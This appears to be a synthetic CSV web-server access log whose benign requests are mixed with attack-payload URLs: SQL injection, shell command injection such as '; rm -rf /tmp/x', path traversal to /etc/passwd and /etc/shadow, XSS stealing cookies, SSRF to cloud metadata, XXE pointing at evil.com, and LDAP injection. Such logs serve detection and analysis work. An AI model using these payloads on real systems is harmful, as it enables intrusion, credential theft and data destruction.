timestamp,source_ip,url
2026-02-07 10:20:16,203.0.113.99,/search?q=test' UNION SELECT * FROM users--
2026-02-07 13:56:39,192.168.5.10,/run?cmd=; rm -rf /tmp/x
2026-02-08 04:06:08,10.0.0.101,/assets/style.css
2026-02-07 17:02:03,192.0.2.5,/api/users?id=123
2026-02-08 05:21:02,10.0.0.99,/fetch?url=dict://127.0.0.1:11211/
2026-02-08 06:57:51,10.0.0.101,/search?q=hello
2026-02-07 23:17:16,10.0.0.101,/api/users?id=123
2026-02-07 23:24:16,203.0.113.10,/view?file=report.pdf
2026-02-07 12:50:47,203.0.113.66,/submit?xml=%3C!DOCTYPE%20x%20[%3C!ENTITY%20y%20SYSTEM%20%22http://evil.com%22%3E]%3E
2026-02-07 18:28:14,192.0.2.5,/search?q=hello
2026-02-08 05:30:38,192.168.1.100,/api?id=1; DROP TABLE users--
2026-02-07 21:56:00,10.0.0.205,/search?q=test' UNION SELECT * FROM users--
2026-02-07 14:31:19,198.51.100.22,/search?q=hello
2026-02-07 10:49:20,172.16.0.100,/view?path=..%2f..%2f..%2fetc%2fpasswd
2026-02-07 21:27:44,192.168.5.10,/shell?c=&& netstat -an
2026-02-07 11:01:20,172.16.1.50,/assets/style.css
2026-02-08 02:39:56,192.168.10.20,/view?file=php://filter/convert.base64-encode/resource=index.php
2026-02-08 01:29:17,172.16.1.50,/api/users?id=123
2026-02-08 04:36:33,198.51.100.22,/index.html
2026-02-08 00:33:16,203.0.113.10,/search?q=hello
2026-02-07 22:32:59,198.51.100.77,/?q=<iframe src=javascript:alert(1)>
2026-02-07 11:59:41,10.0.0.205,/user?name=admin'--
2026-02-08 00:34:35,192.168.2.33,/search?q=<script>alert(1)</script>
2026-02-07 12:44:18,10.0.0.99,/proxy?target=http://localhost:8080
2026-02-08 06:26:27,172.16.2.15,/search?user=*)(uid=*))(|(uid=*
2026-02-07 12:56:24,10.0.0.101,/view?file=report.pdf
2026-02-07 13:10:44,198.51.100.77,/search?q=test%22%3E%3Cscript%3Ealert(1)%3C/script%3E
2026-02-07 12:36:07,192.0.2.5,/login
2026-02-08 06:22:02,198.51.100.77,/search?q=<script>alert(1)</script>
2026-02-07 17:32:22,172.16.1.50,/index.html
2026-02-07 13:21:15,10.0.0.50,/doc?name=....//....//....//etc/shadow
2026-02-08 06:51:24,192.168.2.33,/profile?name=<svg onload=alert(1)>
2026-02-07 11:39:42,172.16.0.100,/static/..%252f..%252f..%252fetc/passwd
2026-02-08 05:56:42,192.168.5.10,/api?x=$(id)
2026-02-07 15:34:29,10.0.0.205,/item?id=1' OR 1=1#
2026-02-07 15:23:58,203.0.113.10,/index.html
2026-02-07 09:54:15,172.16.1.50,/search?q=hello
2026-02-07 18:34:59,198.51.100.200,/proxy?u=gopher://127.0.0.1:25/
2026-02-08 02:54:04,172.16.1.50,/products?category=books&page=2
2026-02-08 04:35:53,10.0.0.50,/view?path=..%2f..%2f..%2fetc%2fpasswd
2026-02-08 06:36:10,192.0.2.5,/view?file=report.pdf
2026-02-07 21:52:42,203.0.113.99,/report?from=1&to=2; DELETE FROM orders
2026-02-08 00:47:26,192.168.5.10,/run?cmd=; whoami
2026-02-08 02:01:15,192.168.10.20,/?page=php://input
2026-02-07 10:38:00,172.16.1.50,/
2026-02-07 16:09:41,198.51.100.22,/products?category=books&page=2
2026-02-08 01:05:44,198.51.100.22,/
2026-02-07 20:50:13,203.0.113.10,/api/users?id=123
2026-02-07 12:01:21,192.168.1.100,/user?name=admin'--
2026-02-08 05:00:39,172.16.2.15,/query?q=*)(&
2026-02-07 13:07:54,203.0.113.10,/products?category=books&page=2
2026-02-07 15:46:22,172.16.0.100,/api/file?path=..\..\..\windows\system32\config\sam
2026-02-08 06:24:14,198.51.100.77,/form?input=document.write('<img src=x>')
2026-02-07 15:04:59,10.0.0.99,/get?url=http://192.168.1.1/admin
2026-02-08 05:30:26,192.0.2.5,/products?category=books&page=2
2026-02-08 00:29:46,192.168.2.33,/comment?text=<img src=x onerror=alert(document.cookie)>
2026-02-07 23:15:12,10.0.0.99,/fetch?url=http://10.0.0.1/internal
2026-02-08 05:06:13,192.168.1.100,/item?id=1' OR 1=1#
2026-02-07 10:34:39,10.0.0.101,/
2026-02-08 05:27:44,203.0.113.10,/assets/style.css
2026-02-07 13:59:46,203.0.113.55,/run?cmd=; whoami
2026-02-08 02:13:43,172.16.0.100,/download?file=../../../etc/passwd
2026-02-08 06:40:17,192.0.2.5,/index.html
2026-02-07 19:58:58,10.0.0.50,/read?f=....//....//....//etc/passwd
2026-02-07 17:43:54,198.51.100.200,/api/callback?url=http://169.254.169.254/latest/meta-data/
2026-02-07 08:06:57,192.168.1.100,/page?id=1 AND 1=1--
2026-02-07 16:08:38,198.51.100.200,/fetch?url=http://10.0.0.1/internal
2026-02-07 20:02:42,172.16.0.100,/read?f=....//....//....//etc/passwd
2026-02-08 02:39:45,172.16.2.15,/ldap?filter=(&(cn=*)(objectClass=*))
2026-02-08 01:20:30,192.0.2.5,/assets/style.css
2026-02-08 04:51:36,172.16.2.15,/auth?name=admin)(|(password=*
2026-02-07 17:12:31,198.51.100.200,/fetch?url=dict://127.0.0.1:11211/
2026-02-08 03:27:39,10.0.0.50,/download?file=../../../etc/passwd
2026-02-07 08:40:09,203.0.113.99,/api?id=1; DROP TABLE users--
2026-02-07 09:55:42,10.0.0.50,/api/file?path=..\..\..\windows\system32\config\sam
2026-02-07 08:47:09,203.0.113.10,/login
2026-02-08 03:02:55,172.16.1.50,/login
2026-02-08 04:52:23,10.0.0.101,/products?category=books&page=2
2026-02-07 13:46:47,198.51.100.22,/api/users?id=123
2026-02-07 07:58:51,192.0.2.5,/
2026-02-07 21:17:29,192.168.10.20,/include?page=....//....//....//etc/passwd
2026-02-08 07:15:20,198.51.100.22,/view?file=report.pdf
2026-02-07 08:40:28,10.0.0.101,/index.html
2026-02-07 12:23:26,198.51.100.22,/login
2026-02-07 12:18:10,192.168.10.20,/doc?path=phar:///var/www/uploads/evil.phar
2026-02-07 22:05:04,172.16.1.50,/view?file=report.pdf
2026-02-07 17:03:57,192.168.2.33,/form?input=document.write('<img src=x>')
2026-02-07 09:21:57,203.0.113.55,/run?cmd=; chmod 777 /var/www
2026-02-08 02:24:02,203.0.113.10,/
2026-02-07 19:15:26,203.0.113.66,/api/xml?data=%3C!ENTITY%20xxe%20SYSTEM%20%22file:///etc/passwd%22%3E
2026-02-07 08:48:40,10.0.0.50,/static/..%252f..%252f..%252fetc/passwd
2026-02-08 05:48:58,10.0.0.205,/login?user=admin' OR '1'='1
2026-02-08 04:51:43,203.0.113.55,/shell?c=&& netstat -an
2026-02-07 09:18:16,192.168.10.20,/load?f=expect://id
2026-02-07 13:22:22,198.51.100.22,/assets/style.css
2026-02-07 23:52:04,203.0.113.55,/run?cmd=; rm -rf /tmp/x
2026-02-08 03:06:27,172.16.0.100,/doc?name=....//....//....//etc/shadow
2026-02-08 05:10:48,10.0.0.101,/login
2026-02-07 16:11:35,203.0.113.99,/login?user=admin' OR '1'='1
